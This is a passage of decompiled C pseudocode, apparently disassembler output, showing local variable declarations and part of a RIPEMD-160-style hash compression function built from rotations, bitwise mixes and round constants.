  int v227; // [esp+68h] [ebp-10h]
  int v228; // [esp+68h] [ebp-10h]
  int v229; // [esp+68h] [ebp-10h]
  int v230; // [esp+68h] [ebp-10h]
  int v231; // [esp+68h] [ebp-10h]
  int v232; // [esp+68h] [ebp-10h]
  int v233; // [esp+68h] [ebp-10h]
  int v234; // [esp+68h] [ebp-10h]
  int v235; // [esp+68h] [ebp-10h]
  int v236; // [esp+68h] [ebp-10h]
  int v237; // [esp+68h] [ebp-10h]
  int v238; // [esp+68h] [ebp-10h]
  int v239; // [esp+68h] [ebp-10h]
  int v240; // [esp+68h] [ebp-10h]
  int v241; // [esp+68h] [ebp-10h]
  int v242; // [esp+68h] [ebp-10h]
  int v243; // [esp+68h] [ebp-10h]
  int v244; // [esp+68h] [ebp-10h]
  int v245; // [esp+68h] [ebp-10h]
  int v246; // [esp+68h] [ebp-10h]
  int v247; // [esp+68h] [ebp-10h]
  int v248; // [esp+68h] [ebp-10h]
  int v249; // [esp+68h] [ebp-10h]
  int v250; // [esp+68h] [ebp-10h]
  int v251; // [esp+68h] [ebp-10h]
  int v252; // [esp+68h] [ebp-10h]
  int v253; // [esp+68h] [ebp-10h]
  int v254; // [esp+68h] [ebp-10h]
  int v255; // [esp+68h] [ebp-10h]
  int v256; // [esp+68h] [ebp-10h]
  int v257; // [esp+6Ch] [ebp-Ch]
  int v258; // [esp+6Ch] [ebp-Ch]
  int v259; // [esp+6Ch] [ebp-Ch]
  int v260; // [esp+6Ch] [ebp-Ch]
  int v261; // [esp+6Ch] [ebp-Ch]
  int v262; // [esp+6Ch] [ebp-Ch]
  int v263; // [esp+6Ch] [ebp-Ch]
  int v264; // [esp+6Ch] [ebp-Ch]
  int v265; // [esp+6Ch] [ebp-Ch]
  int v266; // [esp+6Ch] [ebp-Ch]
  int v267; // [esp+6Ch] [ebp-Ch]
  int v268; // [esp+6Ch] [ebp-Ch]
  int v269; // [esp+6Ch] [ebp-Ch]
  int v270; // [esp+6Ch] [ebp-Ch]
  int v271; // [esp+6Ch] [ebp-Ch]
  int v272; // [esp+6Ch] [ebp-Ch]
  int v273; // [esp+6Ch] [ebp-Ch]
  int v274; // [esp+6Ch] [ebp-Ch]
  int v275; // [esp+6Ch] [ebp-Ch]
  int v276; // [esp+6Ch] [ebp-Ch]
  int v277; // [esp+6Ch] [ebp-Ch]
  int v278; // [esp+6Ch] [ebp-Ch]
  int v279; // [esp+6Ch] [ebp-Ch]
  int v280; // [esp+6Ch] [ebp-Ch]
  int v281; // [esp+6Ch] [ebp-Ch]
  int v282; // [esp+6Ch] [ebp-Ch]
  int v283; // [esp+6Ch] [ebp-Ch]
  int v284; // [esp+6Ch] [ebp-Ch]
  int v285; // [esp+6Ch] [ebp-Ch]
  int v286; // [esp+6Ch] [ebp-Ch]
  int v287; // [esp+70h] [ebp-8h]
  int v288; // [esp+70h] [ebp-8h]
  int v289; // [esp+70h] [ebp-8h]
  int v290; // [esp+70h] [ebp-8h]
  int v291; // [esp+70h] [ebp-8h]
  int v292; // [esp+70h] [ebp-8h]
  int v293; // [esp+70h] [ebp-8h]
  int v294; // [esp+70h] [ebp-8h]
  int v295; // [esp+70h] [ebp-8h]
  int v296; // [esp+70h] [ebp-8h]
  int v297; // [esp+70h] [ebp-8h]
  int v298; // [esp+70h] [ebp-8h]
  int v299; // [esp+70h] [ebp-8h]
  int v300; // [esp+70h] [ebp-8h]
  int v301; // [esp+70h] [ebp-8h]
  int v302; // [esp+70h] [ebp-8h]
  int v303; // [esp+70h] [ebp-8h]
  int v304; // [esp+70h] [ebp-8h]
  int v305; // [esp+70h] [ebp-8h]
  int v306; // [esp+70h] [ebp-8h]
  int v307; // [esp+70h] [ebp-8h]
  int v308; // [esp+70h] [ebp-8h]
  int v309; // [esp+70h] [ebp-8h]
  int v310; // [esp+70h] [ebp-8h]
  int v311; // [esp+70h] [ebp-8h]
  int v312; // [esp+70h] [ebp-8h]
  int v313; // [esp+70h] [ebp-8h]
  int v314; // [esp+70h] [ebp-8h]
  int v315; // [esp+70h] [ebp-8h]
  int v316; // [esp+70h] [ebp-8h]
  int v317; // [esp+70h] [ebp-8h]
  int v318; // [esp+74h] [ebp-4h]
  int v319; // [esp+74h] [ebp-4h]
  int v320; // [esp+74h] [ebp-4h]
  int v321; // [esp+74h] [ebp-4h]
  int v322; // [esp+74h] [ebp-4h]
  int v323; // [esp+74h] [ebp-4h]
  int v324; // [esp+74h] [ebp-4h]
  int v325; // [esp+74h] [ebp-4h]
  int v326; // [esp+74h] [ebp-4h]
  int v327; // [esp+74h] [ebp-4h]
  int v328; // [esp+74h] [ebp-4h]
  int v329; // [esp+74h] [ebp-4h]
  int v330; // [esp+74h] [ebp-4h]
  int v331; // [esp+74h] [ebp-4h]
  int v332; // [esp+74h] [ebp-4h]
  int v333; // [esp+74h] [ebp-4h]
  int v334; // [esp+74h] [ebp-4h]
  int v335; // [esp+74h] [ebp-4h]
  int v336; // [esp+74h] [ebp-4h]
  int v337; // [esp+74h] [ebp-4h]
  int v338; // [esp+74h] [ebp-4h]
  int v339; // [esp+74h] [ebp-4h]
  int v340; // [esp+74h] [ebp-4h]
  int v341; // [esp+74h] [ebp-4h]
  int v342; // [esp+74h] [ebp-4h]
  int v343; // [esp+74h] [ebp-4h]
  int v344; // [esp+74h] [ebp-4h]
  int v345; // [esp+74h] [ebp-4h]
  int v346; // [esp+74h] [ebp-4h]
  int v347; // [esp+74h] [ebp-4h]
  int v348; // [esp+74h] [ebp-4h]
  int v349; // [esp+74h] [ebp-4h]

  v2 = *a1 | ((a1[1] | (*((unsigned __int16 *)a1 + 1) << 8)) << 8);
  v3 = a1[4] | ((a1[5] | (*((unsigned __int16 *)a1 + 3) << 8)) << 8);
  v4 = a1[8] | ((a1[9] | (*((unsigned __int16 *)a1 + 5) << 8)) << 8);
  v42 = a1[12] | ((a1[13] | (*((unsigned __int16 *)a1 + 7) << 8)) << 8);
  v43 = a1[16] | ((a1[17] | ((a1[18] | (a1[19] << 8)) << 8)) << 8);
  v44 = a1[20] | ((a1[21] | ((a1[22] | (a1[23] << 8)) << 8)) << 8);
  v45 = a1[24] | ((a1[25] | ((a1[26] | (a1[27] << 8)) << 8)) << 8);
  v46 = a1[28] | ((a1[29] | ((a1[30] | (a1[31] << 8)) << 8)) << 8);
  v47 = a1[32] | ((a1[33] | (*((unsigned __int16 *)a1 + 17) << 8)) << 8);
  v48 = a1[36] | ((a1[37] | (*((unsigned __int16 *)a1 + 19) << 8)) << 8);
  v49 = a1[40] | ((a1[41] | (*((unsigned __int16 *)a1 + 21) << 8)) << 8);
  v50 = a1[44] | ((a1[45] | ((a1[46] | (a1[47] << 8)) << 8)) << 8);
  v51 = a1[48] | ((a1[49] | ((a1[50] | (a1[51] << 8)) << 8)) << 8);
  v52 = a1[52] | ((a1[53] | ((a1[54] | (a1[55] << 8)) << 8)) << 8);
  v53 = a1[56] | ((a1[57] | ((a1[58] | (a1[59] << 8)) << 8)) << 8);
  v112 = a2[2];
  v83 = a2[3];
  v55 = a2[4];
  v168 = a2[6];
  v140 = a2[5];
  v54 = a1[60] | ((a1[61] | ((a1[62] | (a1[63] << 8)) << 8)) << 8);
  v226 = v168 + __ROL4__(v2 + v112 + (v83 ^ v55 ^ v140), 11);
  v56 = __ROL4__(v55, 10);
  v113 = v168 + __ROL4__(v112 + (v83 ^ (a2[4] | ~v140)) + v44 + 1352829926, 8);
  v318 = v140 + __ROL4__(v3 + v168 + (v226 ^ v83 ^ v56), 14);
  v84 = __ROL4__(v83, 10);
  v169 = v140 + __ROL4__(v168 + (v113 ^ (a2[3] | ~v56)) + v53 + 1352829926, 9);
  v257 = v56 + __ROL4__(v4 + v140 + (v226 ^ v84 ^ v318), 15);
  v227 = __ROL4__(v226, 10);
  v141 = v56 + __ROL4__(v140 + (v169 ^ (v113 | ~v84)) + v46 + 1352829926, 9);
  v114 = __ROL4__(v113, 10);
  v197 = v84 + __ROL4__(v42 + v56 + (v227 ^ v257 ^ v318), 12);
  v319 = __ROL4__(v318, 10);
  v57 = v84 + __ROL4__(v56 + (v141 ^ (v169 | ~v114)) + v2 + 1352829926, 11);
  v170 = __ROL4__(v169, 10);
  v287 = v227 + __ROL4__(v43 + v84 + (v197 ^ v257 ^ v319), 5);
  v258 = __ROL4__(v257, 10);
  v85 = v114 + __ROL4__(v84 + (v57 ^ (v141 | ~v170)) + v48 + 1352829926, 13);
  v142 = __ROL4__(v141, 10);
  v228 = v319 + __ROL4__(v44 + v227 + (v287 ^ v197 ^ v258), 8);
  v198 = __ROL4__(v197, 10);
  v115 = v170 + __ROL4__(v114 + (v85 ^ (v57 | ~v142)) + v4 + 1352829926, 15);
  v58 = __ROL4__(v57, 10);
  v320 = v258 + __ROL4__(v45 + v319 + (v228 ^ v287 ^ v198), 7);
  v288 = __ROL4__(v287, 10);
  v171 = v142 + __ROL4__(v170 + (v115 ^ (v85 | ~v58)) + v50 + 1352829926, 15);
  v86 = __ROL4__(v85, 10);
  v259 = v198 + __ROL4__(v46 + v258 + (v228 ^ v288 ^ v320), 9);
  v229 = __ROL4__(v228, 10);
  v143 = v58 + __ROL4__(v142 + (v171 ^ (v115 | ~v86)) + v43 + 1352829926, 5);
  v116 = __ROL4__(v115, 10);
  v199 = v288 + __ROL4__(v47 + v198 + (v229 ^ v259 ^ v320), 11);
  v321 = __ROL4__(v320, 10);
  v59 = v86 + __ROL4__(v58 + (v143 ^ (v171 | ~v116)) + v52 + 1352829926, 7);
  v172 = __ROL4__(v171, 10);
  v289 = v229 + __ROL4__(v48 + v288 + (v199 ^ v259 ^ v321), 13);
  v260 = __ROL4__(v259, 10);
  v87 = v116 + __ROL4__(v86 + (v59 ^ (v143 | ~v172)) + v45 + 1352829926, 7);
  v144 = __ROL4__(v143, 10);
  v230 = v321 + __ROL4__(v49 + v229 + (v289 ^ v199 ^ v260), 14);
  v200 = __ROL4__(v199, 10);
  v117 = v172 + __ROL4__(v116 + (v87 ^ (v59 | ~v144)) + v54 + 1352829926, 8);
  v60 = __ROL4__(v59, 10);
  v322 = v260 + __ROL4__(v50 + v321 + (v230 ^ v289 ^ v200), 15);
  v290 = __ROL4__(v289, 10);
  v173 = v144 + __ROL4__(v172 + (v117 ^ (v87 | ~v60)) + v47 + 1352829926, 11);
  v88 = __ROL4__(v87, 10);
  v261 = v200 + __ROL4__(v51 + v260 + (v230 ^ v290 ^ v322), 6);
  v231 = __ROL4__(v230, 10);
  v145 = v60 + __ROL4__(v144 + (v173 ^ (v117 | ~v88)) + v3 + 1352829926, 14);
  v118 = __ROL4__(v117, 10);
  v201 = v290 + __ROL4__(v52 + v200 + (v231 ^ v261 ^ v322), 7);
  v323 = __ROL4__(v322, 10);
  v61 = v88 + __ROL4__(v60 + (v145 ^ (v173 | ~v118)) + v49 + 1352829926, 14);
  v174 = __ROL4__(v173, 10);
  v291 = v231 + __ROL4__(v53 + v290 + (v201 ^ v261 ^ v323), 9);
  v262 = __ROL4__(v261, 10);
  v89 = v118 + __ROL4__(v88 + (v61 ^ (v145 | ~v174)) + v42 + 1352829926, 12);
  v146 = __ROL4__(v145, 10);
  v5 = __ROL4__(v54 + v231 + (v291 ^ v201 ^ v262), 8);
  v202 = __ROL4__(v201, 10);
  v232 = v323 + v5;
  v119 = v174 + __ROL4__(v118 + (v89 ^ (v61 | ~v146)) + v51 + 1352829926, 6);
  v62 = __ROL4__(v61, 10);
  v324 = v262 + __ROL4__(v323 + ((v323 + v5) & v291 | v202 & ~(v323 + v5)) + v46 + 1518500249, 7);
  v292 = __ROL4__(v291, 10);
  v175 = v146 + __ROL4__(v174 + (v119 & v62 | v89 & ~v62) + v45 + 1548603684, 9);
  v90 = __ROL4__(v89, 10);
  v6 = __ROL4__(v262 + (v232 & v324 | v292 & ~v324) + v43 + 1518500249, 6);
  v233 = __ROL4__(v232, 10);
  v263 = v202 + v6;
  v147 = v62 + __ROL4__(v146 + (v90 & v175 | v119 & ~v90) + v50 + 1548603684, 13);
  v120 = __ROL4__(v119, 10);
  v203 = v292 + __ROL4__(v202 + ((v202 + v6) & v324 | v233 & ~(v202 + v6)) + v52 + 1518500249, 8);
  v325 = __ROL4__(v324, 10);
  v63 = v90 + __ROL4__(v62 + (v120 & v147 | v175 & ~v120) + v42 + 1548603684, 15);
  v176 = __ROL4__(v175, 10);
  v293 = v233 + __ROL4__(v292 + (v203 & v263 | v325 & ~v203) + v3 + 1518500249, 13);
  v264 = __ROL4__(v263, 10);
  v91 = v120 + __ROL4__(v90 + (v63 & v176 | v147 & ~v176) + v46 + 1548603684, 7);
  v148 = __ROL4__(v147, 10);
  v234 = v325 + __ROL4__(v233 + (v293 & v203 | v264 & ~v293) + v49 + 1518500249, 11);
  v204 = __ROL4__(v203, 10);
  v121 = v176 + __ROL4__(v120 + (v91 & v148 | v63 & ~v148) + v2 + 1548603684, 12);
  v64 = __ROL4__(v63, 10);
  v326 = v264 + __ROL4__(v325 + (v234 & v293 | v204 & ~v234) + v45 + 1518500249, 9);
  v294 = __ROL4__(v293, 10);
  v177 = v148 + __ROL4__(v176 + (v121 & v64 | v91 & ~v64) + v52 + 1548603684, 8);
  v92 = __ROL4__(v91, 10);
  v7 = __ROL4__(v264 + (v234 & v326 | v294 & ~v326) + v54 + 1518500249, 7);
  v235 = __ROL4__(v234, 10);
  v265 = v204 + v7;
  v149 = v64 + __ROL4__(v148 + (v92 & v177 | v121 & ~v92) + v44 + 1548603684, 9);
  v122 = __ROL4__(v121, 10);
  v205 = v294 + __ROL4__(v204 + ((v204 + v7) & v326 | v235 & ~(v204 + v7)) + v42 + 1518500249, 15);
  v327 = __ROL4__(v326, 10);
  v65 = v92 + __ROL4__(v64 + (v122 & v149 | v177 & ~v122) + v49 + 1548603684, 11);
  v178 = __ROL4__(v177, 10);
  v295 = v235 + __ROL4__(v294 + (v205 & v265 | v327 & ~v205) + v51 + 1518500249, 7);
  v266 = __ROL4__(v265, 10);
  v93 = v122 + __ROL4__(v92 + (v65 & v178 | v149 & ~v178) + v53 + 1548603684, 7);
  v150 = __ROL4__(v149, 10);
  v236 = v327 + __ROL4__(v235 + (v295 & v205 | v266 & ~v295) + v2 + 1518500249, 12);
  v206 = __ROL4__(v205, 10);
  v123 = v178 + __ROL4__(v122 + (v93 & v150 | v65 & ~v150) + v54 + 1548603684, 7);
  v66 = __ROL4__(v65, 10);
  v328 = v266 + __ROL4__(v327 + (v236 & v295 | v206 & ~v236) + v48 + 1518500249, 15);
  v296 = __ROL4__(v295, 10);
  v179 = v150 + __ROL4__(v178 + (v123 & v66 | v93 & ~v66) + v47 + 1548603684, 12);
  v94 = __ROL4__(v93, 10);
  v8 = __ROL4__(v266 + (v236 & v328 | v296 & ~v328) + v44 + 1518500249, 9);
  v237 = __ROL4__(v236, 10);
  v267 = v206 + v8;
  v151 = v66 + __ROL4__(v150 + (v94 & v179 | v123 & ~v94) + v51 + 1548603684, 7);
  v124 = __ROL4__(v123, 10);
  v207 = v296 + __ROL4__(v206 + ((v206 + v8) & v328 | v237 & ~(v206 + v8)) + v4 + 1518500249, 11);
  v329 = __ROL4__(v328, 10);
  v67 = v94 + __ROL4__(v66 + (v124 & v151 | v179 & ~v124) + v43 + 1548603684, 6);
  v180 = __ROL4__(v179, 10);
  v297 = v237 + __ROL4__(v296 + (v207 & v267 | v329 & ~v207) + v53 + 1518500249, 7);
  v268 = __ROL4__(v267, 10);
  v95 = v124 + __ROL4__(v94 + (v67 & v180 | v151 & ~v180) + v48 + 1548603684, 15);
  v152 = __ROL4__(v151, 10);
  v238 = v329 + __ROL4__(v237 + (v297 & v207 | v268 & ~v297) + v50 + 1518500249, 13);
  v208 = __ROL4__(v207, 10);
  v125 = v180 + __ROL4__(v124 + (v95 & v152 | v67 & ~v152) + v3 + 1548603684, 13);
  v68 = __ROL4__(v67, 10);
  v330 = v268 + __ROL4__(v329 + (v238 & v297 | v208 & ~v238) + v47 + 1518500249, 12);
  v298 = __ROL4__(v297, 10);
  v9 = v152 + __ROL4__(v180 + (v125 & v68 | v95 & ~v68) + v4 + 1548603684, 11);
  v96 = __ROL4__(v95, 10);
  v269 = v208 + __ROL4__(v268 + (v298 ^ (v330 | ~v238)) + v42 + 1859775393, 11);
  v239 = __ROL4__(v238, 10);
  v153 = v68 + __ROL4__(v152 + (v96 ^ (v9 | ~v125)) + v54 + 1836072691, 9);
  v126 = __ROL4__(v125, 10);
  v209 = v298 + __ROL4__(v208 + (v239 ^ (v269 | ~v330)) + v49 + 1859775393, 13);
  v331 = __ROL4__(v330, 10);
  v10 = v96 + __ROL4__(v68 + (v126 ^ (v153 | ~v9)) + v44 + 1836072691, 7);
  v181 = __ROL4__(v9, 10);
  v299 = v239 + __ROL4__(v298 + (v331 ^ (v209 | ~v269)) + v53 + 1859775393, 6);
  v270 = __ROL4__(v269, 10);
  v97 = v126 + __ROL4__(v96 + (v181 ^ (v10 | ~v153)) + v3 + 1836072691, 15);
  v154 = __ROL4__(v153, 10);
  v240 = v331 + __ROL4__(v239 + (v270 ^ (v299 | ~v209)) + v43 + 1859775393, 7);
  v210 = __ROL4__(v209, 10);
  v11 = v181 + __ROL4__(v126 + (v154 ^ (v97 | ~v10)) + v42 + 1836072691, 11);
  v69 = __ROL4__(v10, 10);
  v332 = v270 + __ROL4__(v331 + (v210 ^ (v240 | ~v299)) + v48 + 1859775393, 14);
  v300 = __ROL4__(v299, 10);
  v182 = v154 + __ROL4__(v181 + (v69 ^ (v11 | ~v97)) + v46 + 1836072691, 8);
  v98 = __ROL4__(v97, 10);
  v271 = v210 + __ROL4__(v270 + (v300 ^ (v332 | ~v240)) + v54 + 1859775393, 9);
  v241 = __ROL4__(v240, 10);
  v12 = v69 + __ROL4__(v154 + (v98 ^ (v182 | ~v11)) + v53 + 1836072691, 6);
  v127 = __ROL4__(v11, 10);
  v211 = v300 + __ROL4__(v210 + (v241 ^ (v271 | ~v332)) + v47 + 1859775393, 13);
  v333 = __ROL4__(v332, 10);
  v70 = v98 + __ROL4__(v69 + (v127 ^ (v12 | ~v182)) + v45 + 1836072691, 6);
  v183 = __ROL4__(v182, 10);
  v301 = v241 + __ROL4__(v300 + (v333 ^ (v211 | ~v271)) + v3 + 1859775393, 15);
  v272 = __ROL4__(v271, 10);
  v13 = v127 + __ROL4__(v98 + (v183 ^ (v70 | ~v12)) + v48 + 1836072691, 14);
  v155 = __ROL4__(v12, 10);
  v242 = v333 + __ROL4__(v241 + (v272 ^ (v301 | ~v211)) + v4 + 1859775393, 14);
  v212 = __ROL4__(v211, 10);
  v128 = v183 + __ROL4__(v127 + (v155 ^ (v13 | ~v70)) + v50 + 1836072691, 12);
  v71 = __ROL4__(v70, 10);
  v334 = v272 + __ROL4__(v333 + (v212 ^ (v242 | ~v301)) + v46 + 1859775393, 8);
  v302 = __ROL4__(v301, 10);
  v14 = v155 + __ROL4__(v183 + (v71 ^ (v128 | ~v13)) + v47 + 1836072691, 13);
  v99 = __ROL4__(v13, 10);
  v273 = v212 + __ROL4__(v272 + (v302 ^ (v334 | ~v242)) + v2 + 1859775393, 13);
  v243 = __ROL4__(v242, 10);
  v156 = v71 + __ROL4__(v155 + (v99 ^ (v14 | ~v128)) + v51 + 1836072691, 5);
  v129 = __ROL4__(v128, 10);
  v213 = v302 + __ROL4__(v212 + (v243 ^ (v273 | ~v334)) + v45 + 1859775393, 6);
  v335 = __ROL4__(v334, 10);
  v15 = v99 + __ROL4__(v71 + (v129 ^ (v156 | ~v14)) + v4 + 1836072691, 14);
  v184 = __ROL4__(v14, 10);
  v303 = v243 + __ROL4__(v302 + (v335 ^ (v213 | ~v273)) + v52 + 1859775393, 5);
  v274 = __ROL4__(v273, 10);
  v100 = v129 + __ROL4__(v99 + (v184 ^ (v15 | ~v156)) + v49 + 1836072691, 13);
  v157 = __ROL4__(v156, 10);
  v244 = v335 + __ROL4__(v243 + (v274 ^ (v303 | ~v213)) + v50 + 1859775393, 12);
  v214 = __ROL4__(v213, 10);
  v16 = v184 + __ROL4__(v129 + (v157 ^ (v100 | ~v15)) + v2 + 1836072691, 13);
  v72 = __ROL4__(v15, 10);
  v336 = v274 + __ROL4__(v335 + (v214 ^ (v244 | ~v303)) + v44 + 1859775393, 7);
  v304 = __ROL4__(v303, 10);
  v185 = v157 + __ROL4__(v184 + (v72 ^ (v16 | ~v100)) + v43 + 1836072691, 7);
  v101 = __ROL4__(v100, 10);
  v275 = v214 + __ROL4__(v274 + (v304 ^ (v336 | ~v244)) + v51 + 1859775393, 5);
  v245 = __ROL4__(v244, 10);
  v17 = __ROL4__(v157 + (v101 ^ (v185 | ~v16)) + v52 + 1836072691, 5);
  v18 = __ROL4__(v16, 10);
  v158 = v72 + v17;
  v215 = v304 + __ROL4__(v214 + (v245 & v275 | v336 & ~v245) + v3 - 1894007588, 11);
  v337 = __ROL4__(v336, 10);
  v73 = v101 + __ROL4__(v72 + (v158 & v185 | v18 & ~v158) + v47 + 2053994217, 15);
  v186 = __ROL4__(v185, 10);
  v305 = v245 + __ROL4__(v304 + (v215 & v337 | v275 & ~v337) + v48 - 1894007588, 12);
  v276 = __ROL4__(v275, 10);
  v102 = v18 + __ROL4__(v101 + (v73 & v158 | v186 & ~v73) + v45 + 2053994217, 5);
  v159 = __ROL4__(v158, 10);
  v246 = v337 + __ROL4__(v245 + (v305 & v276 | v215 & ~v276) + v50 - 1894007588, 14);
  v216 = __ROL4__(v215, 10);
  v130 = v186 + __ROL4__(v18 + (v102 & v73 | v159 & ~v102) + v43 + 2053994217, 8);
  v74 = __ROL4__(v73, 10);
  v338 = v276 + __ROL4__(v337 + (v246 & v216 | v305 & ~v216) + v49 - 1894007588, 15);
  v306 = __ROL4__(v305, 10);
  v187 = v159 + __ROL4__(v186 + (v130 & v102 | v74 & ~v130) + v3 + 2053994217, 11);
  v103 = __ROL4__(v102, 10);
  v277 = v216 + __ROL4__(v276 + (v306 & v338 | v246 & ~v306) + v2 - 1894007588, 14);
  v247 = __ROL4__(v246, 10);
  v19 = __ROL4__(v159 + (v130 & v187 | v103 & ~v187) + v42 + 2053994217, 14);
  v131 = __ROL4__(v130, 10);
  v160 = v74 + v19;
  v217 = v306 + __ROL4__(v216 + (v247 & v277 | v338 & ~v247) + v47 - 1894007588, 15);
  v339 = __ROL4__(v338, 10);
  v75 = v103 + __ROL4__(v74 + ((v74 + v19) & v187 | v131 & ~(v74 + v19)) + v50 + 2053994217, 14);
  v188 = __ROL4__(v187, 10);
  v307 = v247 + __ROL4__(v306 + (v217 & v339 | v277 & ~v339) + v51 - 1894007588, 9);
  v278 = __ROL4__(v277, 10);
  v104 = v131 + __ROL4__(v103 + (v75 & v160 | v188 & ~v75) + v54 + 2053994217, 6);
  v161 = __ROL4__(v160, 10);
  v248 = v339 + __ROL4__(v247 + (v307 & v278 | v217 & ~v278) + v43 - 1894007588, 8);
  v218 = __ROL4__(v217, 10);
  v132 = v188 + __ROL4__(v131 + (v104 & v75 | v161 & ~v104) + v2 + 2053994217, 14);
  v76 = __ROL4__(v75, 10);
  v340 = v278 + __ROL4__(v339 + (v248 & v218 | v307 & ~v218) + v52 - 1894007588, 9);
  v308 = __ROL4__(v307, 10);
  v189 = v161 + __ROL4__(v188 + (v132 & v104 | v76 & ~v132) + v44 + 2053994217, 6);
  v105 = __ROL4__(v104, 10);
  v279 = v218 + __ROL4__(v278 + (v308 & v340 | v248 & ~v308) + v42 - 1894007588, 14);
  v249 = __ROL4__(v248, 10);
  v20 = __ROL4__(v161 + (v132 & v189 | v105 & ~v189) + v51 + 2053994217, 9);
  v133 = __ROL4__(v132, 10);
  v162 = v76 + v20;
  v219 = v308 + __ROL4__(v218 + (v249 & v279 | v340 & ~v249) + v46 - 1894007588, 5);
  v341 = __ROL4__(v340, 10);
  v77 = v105 + __ROL4__(v76 + ((v76 + v20) & v189 | v133 & ~(v76 + v20)) + v4 + 2053994217, 12);
  v190 = __ROL4__(v189, 10);
  v309 = v249 + __ROL4__(v308 + (v219 & v341 | v279 & ~v341) + v54 - 1894007588, 6);
  v280 = __ROL4__(v279, 10);
  v106 = v133 + __ROL4__(v105 + (v77 & v162 | v190 & ~v77) + v52 + 2053994217, 9);
  v163 = __ROL4__(v162, 10);
  v250 = v341 + __ROL4__(v249 + (v309 & v280 | v219 & ~v280) + v53 - 1894007588, 8);
  v220 = __ROL4__(v219, 10);
  v134 = v190 + __ROL4__(v133 + (v106 & v77 | v163 & ~v106) + v48 + 2053994217, 12);
  v78 = __ROL4__(v77, 10);
  v342 = v280 + __ROL4__(v341 + (v250 & v220 | v309 & ~v220) + v44 - 1894007588, 6);
  v310 = __ROL4__(v309, 10);
  v191 = v163 + __ROL4__(v190 + (v134 & v106 | v78 & ~v134) + v46 + 2053994217, 5);
  v107 = __ROL4__(v106, 10);
  v281 = v220 + __ROL4__(v280 + (v310 & v342 | v250 & ~v310) + v45 - 1894007588, 5);
  v251 = __ROL4__(v250, 10);
  v21 = __ROL4__(v163 + (v134 & v191 | v107 & ~v191) + v49 + 2053994217, 15);
  v135 = __ROL4__(v134, 10);
  v22 = v78 + v21;
  v221 = v310 + __ROL4__(v220 + (v251 & v281 | v342 & ~v251) + v4 - 1894007588, 12);
  v343 = __ROL4__(v342, 10);
  v79 = v107 + __ROL4__(v78 + (v22 & v191 | v135 & ~v22) + v53 + 2053994217, 8);
  v192 = __ROL4__(v191, 10);
  v311 = v251 + __ROL4__(v310 + (v221 ^ (v281 | ~v343)) + v43 - 1454113458, 9);
  v282 = __ROL4__(v281, 10);
  v23 = v135 + __ROL4__(v51 + v107 + (v79 ^ v22 ^ v192), 8);
  v164 = __ROL4__(v22, 10);
  v252 = v343 + __ROL4__(v251 + (v311 ^ (v221 | ~v282)) + v2 - 1454113458, 15);
  v222 = __ROL4__(v221, 10);
  v136 = v192 + __ROL4__(v54 + v135 + (v23 ^ v79 ^ v164), 5);
  v80 = __ROL4__(v79, 10);
  v344 = v282 + __ROL4__(v343 + (v252 ^ (v311 | ~v222)) + v44 - 1454113458, 5);
  v312 = __ROL4__(v311, 10);
  v24 = v164 + __ROL4__(v49 + v192 + (v136 ^ v23 ^ v80), 12);
  v108 = __ROL4__(v23, 10);
  v283 = v222 + __ROL4__(v282 + (v344 ^ (v252 | ~v312)) + v48 - 1454113458, 11);
  v253 = __ROL4__(v252, 10);
  v165 = v80 + __ROL4__(v43 + v164 + (v136 ^ v108 ^ v24), 9);
  v137 = __ROL4__(v136, 10);
  v223 = v312 + __ROL4__(v222 + (v283 ^ (v344 | ~v253)) + v46 - 1454113458, 6);
  v345 = __ROL4__(v344, 10);
  v25 = v108 + __ROL4__(v3 + v80 + (v137 ^ v165 ^ v24), 12);
  v193 = __ROL4__(v24, 10);
  v313 = v253 + __ROL4__(v312 + (v223 ^ (v283 | ~v345)) + v51 - 1454113458, 8);
  v284 = __ROL4__(v283, 10);
  v109 = v137 + __ROL4__(v44 + v108 + (v25 ^ v165 ^ v193), 5);
  v166 = __ROL4__(v165, 10);
  v254 = v345 + __ROL4__(v253 + (v313 ^ (v223 | ~v284)) + v4 - 1454113458, 13);
  v224 = __ROL4__(v223, 10);
  v26 = v193 + __ROL4__(v47 + v137 + (v109 ^ v25 ^ v166), 14);
  v81 = __ROL4__(v25, 10);
  v346 = v284 + __ROL4__(v345 + (v254 ^ (v313 | ~v224)) + v49 - 1454113458, 12);
  v314 = __ROL4__(v313, 10);
  v194 = v166 + __ROL4__(v46 + v193 + (v26 ^ v109 ^ v81), 6);
  v110 = __ROL4__(v109, 10);
  v285 = v224 + __ROL4__(v284 + (v346 ^ (v254 | ~v314)) + v53 - 1454113458, 5);
  v255 = __ROL4__(v254, 10);
  v27 = v81 + __ROL4__(v45 + v166 + (v26 ^ v110 ^ v194), 8);
  v138 = __ROL4__(v26, 10);
  v28 = v314 + __ROL4__(v224 + (v285 ^ (v346 | ~v255)) + v3 - 1454113458, 12);
  v347 = __ROL4__(v346, 10);
  v29 = v110 + __ROL4__(v4 + v81 + (v138 ^ v27 ^ v194), 13);
  v195 = __ROL4__(v194, 10);
  v315 = v255 + __ROL4__(v314 + (v28 ^ (v285 | ~v347)) + v42 - 1454113458, 13);
  v286 = __ROL4__(v285, 10);
  v30 = v138 + __ROL4__(v52 + v110 + (v29 ^ v27 ^ v195), 6);
  v167 = __ROL4__(v27, 10);
  v31 = v347 + __ROL4__(v255 + (v315 ^ (v28 | ~v286)) + v47 - 1454113458, 14);
  v225 = __ROL4__(v28, 10);
  v32 = v195 + __ROL4__(v53 + v138 + (v30 ^ v29 ^ v167), 5);
  v82 = __ROL4__(v29, 10);
  v348 = v286 + __ROL4__(v347 + (v31 ^ (v315 | ~v225)) + v50 - 1454113458, 11);
  v316 = __ROL4__(v315, 10);
  v33 = v167 + __ROL4__(v2 + v195 + (v32 ^ v30 ^ v82), 15);
  v111 = __ROL4__(v30, 10);
  v34 = v225 + __ROL4__(v286 + (v348 ^ (v31 | ~v316)) + v45 - 1454113458, 8);
  v256 = __ROL4__(v31, 10);
  v35 = v82 + __ROL4__(v42 + v167 + (v32 ^ v111 ^ v33), 13);
  v139 = __ROL4__(v32, 10);
  v36 = v316 + __ROL4__(v225 + (v34 ^ (v348 | ~v256)) + v54 - 1454113458, 5);
  v349 = __ROL4__(v348, 10);
  v37 = v111 + __ROL4__(v48 + v82 + (v139 ^ v35 ^ v33), 11);
  v196 = __ROL4__(v33, 10);
  v317 = v256 + __ROL4__(v316 + (v36 ^ (v34 | ~v349)) + v52 - 1454113458, 6);
  v38 = a2[3] + __ROL4__(v35, 10) + v36;
  v39 = a2[4] + __ROL4__(v34, 10);
  a2[4] = v139 + v349 + a2[5];
